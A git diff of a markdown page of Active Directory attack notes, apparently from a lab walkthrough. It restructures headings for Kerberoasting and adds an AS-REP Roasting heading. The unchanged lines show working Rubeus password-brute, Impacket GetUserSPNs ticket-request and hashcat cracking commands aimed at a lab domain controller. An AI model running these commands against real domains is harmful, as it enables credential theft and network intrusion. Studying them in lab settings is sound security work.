@@ -85,7 +85,9 @@ Rubeus.exe brute /password:Password1 /noticket
 
 <figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-## Kerberoasting #1 - Rubeus&#x20;
+## Kerberoasting w/ Rubeus & Impacket
+
+### Kerberoasting #1 - Rubeus&#x20;
 
 This will dump the Kerberos hash of any kerberoastable users.
 
@@ -117,7 +119,7 @@ hashcat -m 13100 -a 0 hash.txt Pass.txt --show
 
 <figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
 
-## Kerberoasting #2  - Impacket
+### Kerberoasting #2  - Impacket
 
 ```
 sudo python3.9 /root/test/impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.226.108 -request > hashes.txt
@@ -133,3 +135,5 @@ hashcat -m 13100 -a 0 hashes.txt Pass.txt --show
 ```
 
 <figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>
+
+## AS-REP Roasting w/ Rubeus
